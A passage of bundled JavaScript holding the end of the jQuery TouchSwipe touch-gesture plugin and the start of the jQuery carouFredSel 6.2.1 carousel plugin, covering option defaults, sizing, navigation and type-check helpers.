      CANCEL_EV = SUPPORTS_POINTER ? SUPPORTS_POINTER_IE10 ? "MSPointerCancel" : "pointercancel" : "touchcancel",
      distance = 0,
      direction = null,
      currentDirection = null,
      duration = 0,
      startTouchesDistance = 0,
      endTouchesDistance = 0,
      pinchZoom = 1,
      pinchDistance = 0,
      pinchDirection = 0,
      maximumsMap = null,
      $element = $(element),
      phase = "start",
      fingerCount = 0,
      fingerData = {},
      startTime = 0,
      endTime = 0,
      previousTouchEndTime = 0,
      fingerCountAtRelease = 0,
      doubleTapStartTime = 0,
      singleTapTimeout = null,
      holdTimeout = null;
    try {
      $element.bind(START_EV, touchStart), $element.bind(CANCEL_EV, touchCancel);
    } catch (e) {
      $.error("events not supported " + START_EV + "," + CANCEL_EV + " on jQuery.swipe");
    }
    this.enable = function () {
      return this.disable(), $element.bind(START_EV, touchStart), $element.bind(CANCEL_EV, touchCancel), $element;
    }, this.disable = function () {
      return removeListeners(), $element;
    }, this.destroy = function () {
      removeListeners(), $element.data(PLUGIN_NS, null), $element = null;
    }, this.option = function (property, value) {
      if ("object" == typeof property) options = $.extend(options, property);else if (void 0 !== options[property]) {
        if (void 0 === value) return options[property];
        options[property] = value;
      } else {
        if (!property) return options;
        $.error("Option " + property + " does not exist on jQuery.swipe.options");
      }
      return null;
    };
  }
  var VERSION = "1.6.18",
    LEFT = "left",
    RIGHT = "right",
    UP = "up",
    DOWN = "down",
    IN = "in",
    OUT = "out",
    NONE = "none",
    AUTO = "auto",
    SWIPE = "swipe",
    PINCH = "pinch",
    TAP = "tap",
    DOUBLE_TAP = "doubletap",
    LONG_TAP = "longtap",
    HORIZONTAL = "horizontal",
    VERTICAL = "vertical",
    ALL_FINGERS = "all",
    DOUBLE_TAP_THRESHOLD = 10,
    PHASE_START = "start",
    PHASE_MOVE = "move",
    PHASE_END = "end",
    PHASE_CANCEL = "cancel",
    SUPPORTS_TOUCH = "ontouchstart" in window,
    SUPPORTS_POINTER_IE10 = window.navigator.msPointerEnabled && !window.PointerEvent && !SUPPORTS_TOUCH,
    SUPPORTS_POINTER = (window.PointerEvent || window.navigator.msPointerEnabled) && !SUPPORTS_TOUCH,
    PLUGIN_NS = "TouchSwipe",
    defaults = {
      fingers: 1,
      threshold: 75,
      cancelThreshold: null,
      pinchThreshold: 20,
      maxTimeThreshold: null,
      fingerReleaseThreshold: 250,
      longTapThreshold: 500,
      doubleTapThreshold: 200,
      swipe: null,
      swipeLeft: null,
      swipeRight: null,
      swipeUp: null,
      swipeDown: null,
      swipeStatus: null,
      pinchIn: null,
      pinchOut: null,
      pinchStatus: null,
      click: null,
      tap: null,
      doubleTap: null,
      longTap: null,
      hold: null,
      triggerOnTouchEnd: !0,
      triggerOnTouchLeave: !1,
      allowPageScroll: "auto",
      fallbackToMouseEvents: !0,
      excludedElements: ".noSwipe",
      preventDefaultEvents: !0
    };
  $.fn.swipe = function (method) {
    var $this = $(this),
      plugin = $this.data(PLUGIN_NS);
    if (plugin && "string" == typeof method) {
      if (plugin[method]) return plugin[method].apply(plugin, Array.prototype.slice.call(arguments, 1));
      $.error("Method " + method + " does not exist on jQuery.swipe");
    } else if (plugin && "object" == typeof method) plugin.option.apply(plugin, arguments);else if (!(plugin || "object" != typeof method && method)) return init.apply(this, arguments);
    return $this;
  }, $.fn.swipe.version = VERSION, $.fn.swipe.defaults = defaults, $.fn.swipe.phases = {
    PHASE_START: PHASE_START,
    PHASE_MOVE: PHASE_MOVE,
    PHASE_END: PHASE_END,
    PHASE_CANCEL: PHASE_CANCEL
  }, $.fn.swipe.directions = {
    LEFT: LEFT,
    RIGHT: RIGHT,
    UP: UP,
    DOWN: DOWN,
    IN: IN,
    OUT: OUT
  }, $.fn.swipe.pageScroll = {
    NONE: NONE,
    HORIZONTAL: HORIZONTAL,
    VERTICAL: VERTICAL,
    AUTO: AUTO
  }, $.fn.swipe.fingers = {
    ONE: 1,
    TWO: 2,
    THREE: 3,
    FOUR: 4,
    FIVE: 5,
    ALL: ALL_FINGERS
  };
});
;
/*
 *	jQuery carouFredSel 6.2.1
 *	Demo's and documentation:
 *	caroufredsel.dev7studios.com
 *
 *	Copyright (c) 2013 Fred Heusschen
 *	www.frebsite.nl
 *
 *	Dual licensed under the MIT and GPL licenses.
 *	http://en.wikipedia.org/wiki/MIT_License
 *	http://en.wikipedia.org/wiki/GNU_General_Public_License
 */

(function ($) {
  function sc_setScroll(a, b, c) {
    return "transition" == c.transition && "swing" == b && (b = "ease"), {
      anims: [],
      duration: a,
      orgDuration: a,
      easing: b,
      startTime: getTime()
    };
  }
  function sc_startScroll(a, b) {
    for (var c = 0, d = a.anims.length; d > c; c++) {
      var e = a.anims[c];
      e && e[0][b.transition](e[1], a.duration, a.easing, e[2]);
    }
  }
  function sc_stopScroll(a, b) {
    is_boolean(b) || (b = !0), is_object(a.pre) && sc_stopScroll(a.pre, b);
    for (var c = 0, d = a.anims.length; d > c; c++) {
      var e = a.anims[c];
      e[0].stop(!0), b && (e[0].css(e[1]), is_function(e[2]) && e[2]());
    }
    is_object(a.post) && sc_stopScroll(a.post, b);
  }
  function sc_afterScroll(a, b, c) {
    switch (b && b.remove(), c.fx) {
      case "fade":
      case "crossfade":
      case "cover-fade":
      case "uncover-fade":
        a.css("opacity", 1), a.css("filter", "");
    }
  }
  function sc_fireCallbacks(a, b, c, d, e) {
    if (b[c] && b[c].call(a, d), e[c].length) for (var f = 0, g = e[c].length; g > f; f++) e[c][f].call(a, d);
    return [];
  }
  function sc_fireQueue(a, b, c) {
    return b.length && (a.trigger(cf_e(b[0][0], c), b[0][1]), b.shift()), b;
  }
  function sc_hideHiddenItems(a) {
    a.each(function () {
      var a = $(this);
      a.data("_cfs_isHidden", a.is(":hidden")).hide();
    });
  }
  function sc_showHiddenItems(a) {
    a && a.each(function () {
      var a = $(this);
      a.data("_cfs_isHidden") || a.show();
    });
  }
  function sc_clearTimers(a) {
    return a.auto && clearTimeout(a.auto), a.progress && clearInterval(a.progress), a;
  }
  function sc_mapCallbackArguments(a, b, c, d, e, f, g) {
    return {
      width: g.width,
      height: g.height,
      items: {
        old: a,
        skipped: b,
        visible: c
      },
      scroll: {
        items: d,
        direction: e,
        duration: f
      }
    };
  }
  function sc_getDuration(a, b, c, d) {
    var e = a.duration;
    return "none" == a.fx ? 0 : ("auto" == e ? e = b.scroll.duration / b.scroll.items * c : 10 > e && (e = d / e), 1 > e ? 0 : ("fade" == a.fx && (e /= 2), Math.round(e)));
  }
  function nv_showNavi(a, b, c) {
    var d = is_number(a.items.minimum) ? a.items.minimum : a.items.visible + 1;
    if ("show" == b || "hide" == b) var e = b;else if (d > b) {
      debug(c, "Not enough items (" + b + " total, " + d + " needed): Hiding navigation.");
      var e = "hide";
    } else var e = "show";
    var f = "show" == e ? "removeClass" : "addClass",
      g = cf_c("hidden", c);
    a.auto.button && a.auto.button[e]()[f](g), a.prev.button && a.prev.button[e]()[f](g), a.next.button && a.next.button[e]()[f](g), a.pagination.container && a.pagination.container[e]()[f](g);
  }
  function nv_enableNavi(a, b, c) {
    if (!a.circular && !a.infinite) {
      var d = "removeClass" == b || "addClass" == b ? b : !1,
        e = cf_c("disabled", c);
      if (a.auto.button && d && a.auto.button[d](e), a.prev.button) {
        var f = d || 0 == b ? "addClass" : "removeClass";
        a.prev.button[f](e);
      }
      if (a.next.button) {
        var f = d || b == a.items.visible ? "addClass" : "removeClass";
        a.next.button[f](e);
      }
    }
  }
  function go_getObject(a, b) {
    return is_function(b) ? b = b.call(a) : is_undefined(b) && (b = {}), b;
  }
  function go_getItemsObject(a, b) {
    return b = go_getObject(a, b), is_number(b) ? b = {
      visible: b
    } : "variable" == b ? b = {
      visible: b,
      width: b,
      height: b
    } : is_object(b) || (b = {}), b;
  }
  function go_getScrollObject(a, b) {
    return b = go_getObject(a, b), is_number(b) ? b = 50 >= b ? {
      items: b
    } : {
      duration: b
    } : is_string(b) ? b = {
      easing: b
    } : is_object(b) || (b = {}), b;
  }
  function go_getNaviObject(a, b) {
    if (b = go_getObject(a, b), is_string(b)) {
      var c = cf_getKeyCode(b);
      b = -1 == c ? $(b) : c;
    }
    return b;
  }
  function go_getAutoObject(a, b) {
    return b = go_getNaviObject(a, b), is_jquery(b) ? b = {
      button: b
    } : is_boolean(b) ? b = {
      play: b
    } : is_number(b) && (b = {
      timeoutDuration: b
    }), b.progress && (is_string(b.progress) || is_jquery(b.progress)) && (b.progress = {
      bar: b.progress
    }), b;
  }
  function go_complementAutoObject(a, b) {
    return is_function(b.button) && (b.button = b.button.call(a)), is_string(b.button) && (b.button = $(b.button)), is_boolean(b.play) || (b.play = !0), is_number(b.delay) || (b.delay = 0), is_undefined(b.pauseOnEvent) && (b.pauseOnEvent = !0), is_boolean(b.pauseOnResize) || (b.pauseOnResize = !0), is_number(b.timeoutDuration) || (b.timeoutDuration = 10 > b.duration ? 2500 : 5 * b.duration), b.progress && (is_function(b.progress.bar) && (b.progress.bar = b.progress.bar.call(a)), is_string(b.progress.bar) && (b.progress.bar = $(b.progress.bar)), b.progress.bar ? (is_function(b.progress.updater) || (b.progress.updater = $.fn.carouFredSel.progressbarUpdater), is_number(b.progress.interval) || (b.progress.interval = 50)) : b.progress = !1), b;
  }
  function go_getPrevNextObject(a, b) {
    return b = go_getNaviObject(a, b), is_jquery(b) ? b = {
      button: b
    } : is_number(b) && (b = {
      key: b
    }), b;
  }
  function go_complementPrevNextObject(a, b) {
    return is_function(b.button) && (b.button = b.button.call(a)), is_string(b.button) && (b.button = $(b.button)), is_string(b.key) && (b.key = cf_getKeyCode(b.key)), b;
  }
  function go_getPaginationObject(a, b) {
    return b = go_getNaviObject(a, b), is_jquery(b) ? b = {
      container: b
    } : is_boolean(b) && (b = {
      keys: b
    }), b;
  }
  function go_complementPaginationObject(a, b) {
    return is_function(b.container) && (b.container = b.container.call(a)), is_string(b.container) && (b.container = $(b.container)), is_number(b.items) || (b.items = !1), is_boolean(b.keys) || (b.keys = !1), is_function(b.anchorBuilder) || is_false(b.anchorBuilder) || (b.anchorBuilder = $.fn.carouFredSel.pageAnchorBuilder), is_number(b.deviation) || (b.deviation = 0), b;
  }
  function go_getSwipeObject(a, b) {
    return is_function(b) && (b = b.call(a)), is_undefined(b) && (b = {
      onTouch: !1
    }), is_true(b) ? b = {
      onTouch: b
    } : is_number(b) && (b = {
      items: b
    }), b;
  }
  function go_complementSwipeObject(a, b) {
    return is_boolean(b.onTouch) || (b.onTouch = !0), is_boolean(b.onMouse) || (b.onMouse = !1), is_object(b.options) || (b.options = {}), is_boolean(b.options.triggerOnTouchEnd) || (b.options.triggerOnTouchEnd = !1), b;
  }
  function go_getMousewheelObject(a, b) {
    return is_function(b) && (b = b.call(a)), is_true(b) ? b = {} : is_number(b) ? b = {
      items: b
    } : is_undefined(b) && (b = !1), b;
  }
  function go_complementMousewheelObject(a, b) {
    return b;
  }
  function gn_getItemIndex(a, b, c, d, e) {
    if (is_string(a) && (a = $(a, e)), is_object(a) && (a = $(a, e)), is_jquery(a) ? (a = e.children().index(a), is_boolean(c) || (c = !1)) : is_boolean(c) || (c = !0), is_number(a) || (a = 0), is_number(b) || (b = 0), c && (a += d.first), a += b, d.total > 0) {
      for (; a >= d.total;) a -= d.total;
      for (; 0 > a;) a += d.total;
    }
    return a;
  }
  function gn_getVisibleItemsPrev(a, b, c) {
    for (var d = 0, e = 0, f = c; f >= 0; f--) {
      var g = a.eq(f);
      if (d += g.is(":visible") ? g[b.d.outerWidth](!0) : 0, d > b.maxDimension) return e;
      0 == f && (f = a.length), e++;
    }
  }
  function gn_getVisibleItemsPrevFilter(a, b, c) {
    return gn_getItemsPrevFilter(a, b.items.filter, b.items.visibleConf.org, c);
  }
  function gn_getScrollItemsPrevFilter(a, b, c, d) {
    return gn_getItemsPrevFilter(a, b.items.filter, d, c);
  }
  function gn_getItemsPrevFilter(a, b, c, d) {
    for (var e = 0, f = 0, g = d, h = a.length; g >= 0; g--) {
      if (f++, f == h) return f;
      var i = a.eq(g);
      if (i.is(b) && (e++, e == c)) return f;
      0 == g && (g = h);
    }
  }
  function gn_getVisibleOrg(a, b) {
    return b.items.visibleConf.org || a.children().slice(0, b.items.visible).filter(b.items.filter).length;
  }
  function gn_getVisibleItemsNext(a, b, c) {
    for (var d = 0, e = 0, f = c, g = a.length - 1; g >= f; f++) {
      var h = a.eq(f);
      if (d += h.is(":visible") ? h[b.d.outerWidth](!0) : 0, d > b.maxDimension) return e;
      if (e++, e == g + 1) return e;
      f == g && (f = -1);
    }
  }
  function gn_getVisibleItemsNextTestCircular(a, b, c, d) {
    var e = gn_getVisibleItemsNext(a, b, c);
    return b.circular || c + e > d && (e = d - c), e;
  }
  function gn_getVisibleItemsNextFilter(a, b, c) {
    return gn_getItemsNextFilter(a, b.items.filter, b.items.visibleConf.org, c, b.circular);
  }
  function gn_getScrollItemsNextFilter(a, b, c, d) {
    return gn_getItemsNextFilter(a, b.items.filter, d + 1, c, b.circular) - 1;
  }
  function gn_getItemsNextFilter(a, b, c, d) {
    for (var f = 0, g = 0, h = d, i = a.length - 1; i >= h; h++) {
      if (g++, g >= i) return g;
      var j = a.eq(h);
      if (j.is(b) && (f++, f == c)) return g;
      h == i && (h = -1);
    }
  }
  function gi_getCurrentItems(a, b) {
    return a.slice(0, b.items.visible);
  }
  function gi_getOldItemsPrev(a, b, c) {
    return a.slice(c, b.items.visibleConf.old + c);
  }
  function gi_getNewItemsPrev(a, b) {
    return a.slice(0, b.items.visible);
  }
  function gi_getOldItemsNext(a, b) {
    return a.slice(0, b.items.visibleConf.old);
  }
  function gi_getNewItemsNext(a, b, c) {
    return a.slice(c, b.items.visible + c);
  }
  function sz_storeMargin(a, b, c) {
    b.usePadding && (is_string(c) || (c = "_cfs_origCssMargin"), a.each(function () {
      var a = $(this),
        d = parseInt(a.css(b.d.marginRight), 10);
      is_number(d) || (d = 0), a.data(c, d);
    }));
  }
  function sz_resetMargin(a, b, c) {
    if (b.usePadding) {
      var d = is_boolean(c) ? c : !1;
      is_number(c) || (c = 0), sz_storeMargin(a, b, "_cfs_tempCssMargin"), a.each(function () {
        var a = $(this);
        a.css(b.d.marginRight, d ? a.data("_cfs_tempCssMargin") : c + a.data("_cfs_origCssMargin"));
      });
    }
  }
  function sz_storeOrigCss(a) {
    a.each(function () {
      var a = $(this);
      a.data("_cfs_origCss", a.attr("style") || "");
    });
  }
  function sz_restoreOrigCss(a) {
    a.each(function () {
      var a = $(this);
      a.attr("style", a.data("_cfs_origCss") || "");
    });
  }
  function sz_setResponsiveSizes(a, b) {
    var d = (a.items.visible, a.items[a.d.width]),
      e = a[a.d.height],
      f = is_percentage(e);
    b.each(function () {
      var b = $(this),
        c = d - ms_getPaddingBorderMargin(b, a, "Width");
      b[a.d.width](c), f && b[a.d.height](ms_getPercentage(c, e));
    });
  }
  function sz_setSizes(a, b) {
    var c = a.parent(),
      d = a.children(),
      e = gi_getCurrentItems(d, b),
      f = cf_mapWrapperSizes(ms_getSizes(e, b, !0), b, !1);
    if (c.css(f), b.usePadding) {
      var g = b.padding,
        h = g[b.d[1]];
      b.align && 0 > h && (h = 0);
      var i = e.last();
      i.css(b.d.marginRight, i.data("_cfs_origCssMargin") + h), a.css(b.d.top, g[b.d[0]]), a.css(b.d.left, g[b.d[3]]);
    }
    return a.css(b.d.width, f[b.d.width] + 2 * ms_getTotalSize(d, b, "width")), a.css(b.d.height, ms_getLargestSize(d, b, "height")), f;
  }
  function ms_getSizes(a, b, c) {
    return [ms_getTotalSize(a, b, "width", c), ms_getLargestSize(a, b, "height", c)];
  }
  function ms_getLargestSize(a, b, c, d) {
    return is_boolean(d) || (d = !1), is_number(b[b.d[c]]) && d ? b[b.d[c]] : is_number(b.items[b.d[c]]) ? b.items[b.d[c]] : (c = c.toLowerCase().indexOf("width") > -1 ? "outerWidth" : "outerHeight", ms_getTrueLargestSize(a, b, c));
  }
  function ms_getTrueLargestSize(a, b, c) {
    for (var d = 0, e = 0, f = a.length; f > e; e++) {
      var g = a.eq(e),
        h = g.is(":visible") ? g[b.d[c]](!0) : 0;
      h > d && (d = h);
    }
    return d;
  }
  function ms_getTotalSize(a, b, c, d) {
    if (is_boolean(d) || (d = !1), is_number(b[b.d[c]]) && d) return b[b.d[c]];
    if (is_number(b.items[b.d[c]])) return b.items[b.d[c]] * a.length;
    for (var e = c.toLowerCase().indexOf("width") > -1 ? "outerWidth" : "outerHeight", f = 0, g = 0, h = a.length; h > g; g++) {
      var i = a.eq(g);
      f += i.is(":visible") ? i[b.d[e]](!0) : 0;
    }
    return f;
  }
  function ms_getParentSize(a, b, c) {
    var d = a.is(":visible");
    d && a.hide();
    var e = a.parent()[b.d[c]]();
    return d && a.show(), e;
  }
  function ms_getMaxDimension(a, b) {
    return is_number(a[a.d.width]) ? a[a.d.width] : b;
  }
  function ms_hasVariableSizes(a, b, c) {
    for (var d = !1, e = !1, f = 0, g = a.length; g > f; f++) {
      var h = a.eq(f),
        i = h.is(":visible") ? h[b.d[c]](!0) : 0;
      d === !1 ? d = i : d != i && (e = !0), 0 == d && (e = !0);
    }
    return e;
  }
  function ms_getPaddingBorderMargin(a, b, c) {
    return a[b.d["outer" + c]](!0) - a[b.d[c.toLowerCase()]]();
  }
  function ms_getPercentage(a, b) {
    if (is_percentage(b)) {
      if (b = parseInt(b.slice(0, -1), 10), !is_number(b)) return a;
      a *= b / 100;
    }
    return a;
  }
  function cf_e(a, b, c, d, e) {
    return is_boolean(c) || (c = !0), is_boolean(d) || (d = !0), is_boolean(e) || (e = !1), c && (a = b.events.prefix + a), d && (a = a + "." + b.events.namespace), d && e && (a += b.serialNumber), a;
  }
  function cf_c(a, b) {
    return is_string(b.classnames[a]) ? b.classnames[a] : a;
  }
  function cf_mapWrapperSizes(a, b, c) {
    is_boolean(c) || (c = !0);
    var d = b.usePadding && c ? b.padding : [0, 0, 0, 0],
      e = {};
    return e[b.d.width] = a[0] + d[1] + d[3], e[b.d.height] = a[1] + d[0] + d[2], e;
  }
  function cf_sortParams(a, b) {
    for (var c = [], d = 0, e = a.length; e > d; d++) for (var f = 0, g = b.length; g > f; f++) if (b[f].indexOf(typeof a[d]) > -1 && is_undefined(c[f])) {
      c[f] = a[d];
      break;
    }
    return c;
  }
  function cf_getPadding(a) {
    if (is_undefined(a)) return [0, 0, 0, 0];
    if (is_number(a)) return [a, a, a, a];
    if (is_string(a) && (a = a.split("px").join("").split("em").join("").split(" ")), !is_array(a)) return [0, 0, 0, 0];
    for (var b = 0; 4 > b; b++) a[b] = parseInt(a[b], 10);
    switch (a.length) {
      case 0:
        return [0, 0, 0, 0];
      case 1:
        return [a[0], a[0], a[0], a[0]];
      case 2:
        return [a[0], a[1], a[0], a[1]];
      case 3:
        return [a[0], a[1], a[2], a[1]];
      default:
        return [a[0], a[1], a[2], a[3]];
    }
  }
  function cf_getAlignPadding(a, b) {
    var c = is_number(b[b.d.width]) ? Math.ceil(b[b.d.width] - ms_getTotalSize(a, b, "width")) : 0;
    switch (b.align) {
      case "left":
        return [0, c];
      case "right":
        return [c, 0];
      case "center":
      default:
        return [Math.ceil(c / 2), Math.floor(c / 2)];
    }
  }
  function cf_getDimensions(a) {
    for (var b = [["width", "innerWidth", "outerWidth", "height", "innerHeight", "outerHeight", "left", "top", "marginRight", 0, 1, 2, 3], ["height", "innerHeight", "outerHeight", "width", "innerWidth", "outerWidth", "top", "left", "marginBottom", 3, 2, 1, 0]], c = b[0].length, d = "right" == a.direction || "left" == a.direction ? 0 : 1, e = {}, f = 0; c > f; f++) e[b[0][f]] = b[d][f];
    return e;
  }
  function cf_getAdjust(a, b, c, d) {
    var e = a;
    if (is_function(c)) e = c.call(d, e);else if (is_string(c)) {
      var f = c.split("+"),
        g = c.split("-");
      if (g.length > f.length) var h = !0,
        i = g[0],
        j = g[1];else var h = !1,
        i = f[0],
        j = f[1];
      switch (i) {
        case "even":
          e = 1 == a % 2 ? a - 1 : a;
          break;
        case "odd":
          e = 0 == a % 2 ? a - 1 : a;
          break;
        default:
          e = a;
      }
      j = parseInt(j, 10), is_number(j) && (h && (j = -j), e += j);
    }
    return (!is_number(e) || 1 > e) && (e = 1), e;
  }
  function cf_getItemsAdjust(a, b, c, d) {
    return cf_getItemAdjustMinMax(cf_getAdjust(a, b, c, d), b.items.visibleConf);
  }
  function cf_getItemAdjustMinMax(a, b) {
    return is_number(b.min) && b.min > a && (a = b.min), is_number(b.max) && a > b.max && (a = b.max), 1 > a && (a = 1), a;
  }
  function cf_getSynchArr(a) {
    is_array(a) || (a = [[a]]), is_array(a[0]) || (a = [a]);
    for (var b = 0, c = a.length; c > b; b++) is_string(a[b][0]) && (a[b][0] = $(a[b][0])), is_boolean(a[b][1]) || (a[b][1] = !0), is_boolean(a[b][2]) || (a[b][2] = !0), is_number(a[b][3]) || (a[b][3] = 0);
    return a;
  }
  function cf_getKeyCode(a) {
    return "right" == a ? 39 : "left" == a ? 37 : "up" == a ? 38 : "down" == a ? 40 : -1;
  }
  function cf_setCookie(a, b, c) {
    if (a) {
      var d = b.triggerHandler(cf_e("currentPosition", c));
      $.fn.carouFredSel.cookie.set(a, d);
    }
  }
  function cf_getCookie(a) {
    var b = $.fn.carouFredSel.cookie.get(a);
    return "" == b ? 0 : b;
  }
  function in_mapCss(a, b) {
    for (var c = {}, d = 0, e = b.length; e > d; d++) c[b[d]] = a.css(b[d]);
    return c;
  }
  function in_complementItems(a, b, c, d) {
    return is_object(a.visibleConf) || (a.visibleConf = {}), is_object(a.sizesConf) || (a.sizesConf = {}), 0 == a.start && is_number(d) && (a.start = d), is_object(a.visible) ? (a.visibleConf.min = a.visible.min, a.visibleConf.max = a.visible.max, a.visible = !1) : is_string(a.visible) ? ("variable" == a.visible ? a.visibleConf.variable = !0 : a.visibleConf.adjust = a.visible, a.visible = !1) : is_function(a.visible) && (a.visibleConf.adjust = a.visible, a.visible = !1), is_string(a.filter) || (a.filter = c.filter(":hidden").length > 0 ? ":visible" : "*"), a[b.d.width] || (b.responsive ? (debug(!0, "Set a " + b.d.width + " for the items!"), a[b.d.width] = ms_getTrueLargestSize(c, b, "outerWidth")) : a[b.d.width] = ms_hasVariableSizes(c, b, "outerWidth") ? "variable" : c[b.d.outerWidth](!0)), a[b.d.height] || (a[b.d.height] = ms_hasVariableSizes(c, b, "outerHeight") ? "variable" : c[b.d.outerHeight](!0)), a.sizesConf.width = a.width, a.sizesConf.height = a.height, a;
  }
  function in_complementVisibleItems(a, b) {
    return "variable" == a.items[a.d.width] && (a.items.visibleConf.variable = !0), a.items.visibleConf.variable || (is_number(a[a.d.width]) ? a.items.visible = Math.floor(a[a.d.width] / a.items[a.d.width]) : (a.items.visible = Math.floor(b / a.items[a.d.width]), a[a.d.width] = a.items.visible * a.items[a.d.width], a.items.visibleConf.adjust || (a.align = !1)), ("Infinity" == a.items.visible || 1 > a.items.visible) && (debug(!0, 'Not a valid number of visible items: Set to "variable".'), a.items.visibleConf.variable = !0)), a;
  }
  function in_complementPrimarySize(a, b, c) {
    return "auto" == a && (a = ms_getTrueLargestSize(c, b, "outerWidth")), a;
  }
  function in_complementSecondarySize(a, b, c) {
    return "auto" == a && (a = ms_getTrueLargestSize(c, b, "outerHeight")), a || (a = b.items[b.d.height]), a;
  }
  function in_getAlignPadding(a, b) {
    var c = cf_getAlignPadding(gi_getCurrentItems(b, a), a);
    return a.padding[a.d[1]] = c[1], a.padding[a.d[3]] = c[0], a;
  }
  function in_getResponsiveValues(a, b) {
    var d = cf_getItemAdjustMinMax(Math.ceil(a[a.d.width] / a.items[a.d.width]), a.items.visibleConf);
    d > b.length && (d = b.length);
    var e = Math.floor(a[a.d.width] / d);
    return a.items.visible = d, a.items[a.d.width] = e, a[a.d.width] = d * e, a;
  }
  function bt_pauseOnHoverConfig(a) {
    if (is_string(a)) var b = a.indexOf("immediate") > -1 ? !0 : !1,
      c = a.indexOf("resume") > -1 ? !0 : !1;else var b = c = !1;
    return [b, c];
  }
  function bt_mousesheelNumber(a) {
    return is_number(a) ? a : null;
  }
  function is_null(a) {
    return null === a;
  }
  function is_undefined(a) {
    return is_null(a) || a === void 0 || "" === a || "undefined" === a;
  }
  function is_array(a) {
    return a instanceof Array;
  }
  function is_jquery(a) {
    return a instanceof jQuery;
  }
  function is_object(a) {
    return (a instanceof Object || "object" == typeof a) && !is_null(a) && !is_jquery(a) && !is_array(a) && !is_function(a);
  }
  function is_number(a) {
    return (a instanceof Number || "number" == typeof a) && !isNaN(a);
  }
  function is_string(a) {
    return (a instanceof String || "string" == typeof a) && !is_undefined(a) && !is_true(a) && !is_false(a);
  }
  function is_function(a) {
    return a instanceof Function || "function" == typeof a;
  }
  function is_boolean(a) {
    return a instanceof Boolean || "boolean" == typeof a || is_true(a) || is_false(a);
  }
  function is_true(a) {
    return a === !0 || "true" === a;
  }
  function is_false(a) {
    return a === !1 || "false" === a;
  }
  function is_percentage(a) {
    return is_string(a) && "%" == a.slice(-1);
  }
  function getTime() {
    return new Date().getTime();
  }
  function deprecated(a, b) {
    debug(!0, a + " is DEPRECATED, support for it will be removed. Use " + b + " instead.");
  }
  function debug(a, b) {
    if (!is_undefined(window.console) && !is_undefined(window.console.log)) {
      if (is_object(a)) {
        var c = " (" + a.selector + ")";
        a = a.debug;
      } else var c = "";
      if (!a) return !1;
      b = is_string(b) ? "carouFredSel" + c + ": " + b : ["carouFredSel" + c + ":", b], window.console.log(b);
    }
    return !1;
  }
  $.fn.carouFredSel || ($.fn.caroufredsel = $.fn.carouFredSel = function (options, configs) {
    if (0 == this.length) return debug(!0, 'No element found for "' + this.selector + '".'), this;
    if (this.length > 1) return this.each(function () {
      $(this).carouFredSel(options, configs);
    });
    var $cfs = this,
      $tt0 = this[0],
      starting_position = !1;
    $cfs.data("_cfs_isCarousel") && (starting_position = $cfs.triggerHandler("_cfs_triggerEvent", "currentPosition"), $cfs.trigger("_cfs_triggerEvent", ["destroy", !0]));
    var FN = {};
    FN._init = function (a, b, c) {
      a = go_getObject($tt0, a), a.items = go_getItemsObject($tt0, a.items), a.scroll = go_getScrollObject($tt0, a.scroll), a.auto = go_getAutoObject($tt0, a.auto), a.prev = go_getPrevNextObject($tt0, a.prev), a.next = go_getPrevNextObject($tt0, a.next), a.pagination = go_getPaginationObject($tt0, a.pagination), a.swipe = go_getSwipeObject($tt0, a.swipe), a.mousewheel = go_getMousewheelObject($tt0, a.mousewheel), b && (opts_orig = $.extend(!0, {}, $.fn.carouFredSel.defaults, a)), opts = $.extend(!0, {}, $.fn.carouFredSel.defaults, a), opts.d = cf_getDimensions(opts), crsl.direction = "up" == opts.direction || "left" == opts.direction ? "next" : "prev";
      var d = $cfs.children(),
        e = ms_getParentSize($wrp, opts, "width");
      if (is_true(opts.cookie) && (opts.cookie = "caroufredsel_cookie_" + conf.serialNumber), opts.maxDimension = ms_getMaxDimension(opts, e), opts.items = in_complementItems(opts.items, opts, d, c), opts[opts.d.width] = in_complementPrimarySize(opts[opts.d.width], opts, d), opts[opts.d.height] = in_complementSecondarySize(opts[opts.d.height], opts, d), opts.responsive && (is_percentage(opts[opts.d.width]) || (opts[opts.d.width] = "100%")), is_percentage(opts[opts.d.width]) && (crsl.upDateOnWindowResize = !0, crsl.primarySizePercentage = opts[opts.d.width], opts[opts.d.width] = ms_getPercentage(e, crsl.primarySizePercentage), opts.items.visible || (opts.items.visibleConf.variable = !0)), opts.responsive ? (opts.usePadding = !1, opts.padding = [0, 0, 0, 0], opts.align = !1, opts.items.visibleConf.variable = !1) : (opts.items.visible || (opts = in_complementVisibleItems(opts, e)), opts[opts.d.width] || (!opts.items.visibleConf.variable && is_number(opts.items[opts.d.width]) && "*" == opts.items.filter ? (opts[opts.d.width] = opts.items.visible * opts.items[opts.d.width], opts.align = !1) : opts[opts.d.width] = "variable"), is_undefined(opts.align) && (opts.align = is_number(opts[opts.d.width]) ? "center" : !1), opts.items.visibleConf.variable && (opts.items.visible = gn_getVisibleItemsNext(d, opts, 0))), "*" == opts.items.filter || opts.items.visibleConf.variable || (opts.items.visibleConf.org = opts.items.visible, opts.items.visible = gn_getVisibleItemsNextFilter(d, opts, 0)), opts.items.visible = cf_getItemsAdjust(opts.items.visible, opts, opts.items.visibleConf.adjust, $tt0), opts.items.visibleConf.old = opts.items.visible, opts.responsive) opts.items.visibleConf.min || (opts.items.visibleConf.min = opts.items.visible), opts.items.visibleConf.max || (opts.items.visibleConf.max = opts.items.visible), opts = in_getResponsiveValues(opts, d, e);else switch (opts.padding = cf_getPadding(opts.padding), "top" == opts.align ? opts.align = "left" : "bottom" == opts.align && (opts.align = "right"), opts.align) {
        case "center":
        case "left":
        case "right":
          "variable" != opts[opts.d.width] && (opts = in_getAlignPadding(opts, d), opts.usePadding = !0);
          break;
        default:
          opts.align = !1, opts.usePadding = 0 == opts.padding[0] && 0 == opts.padding[1] && 0 == opts.padding[2] && 0 == opts.padding[3] ? !1 : !0;
      }
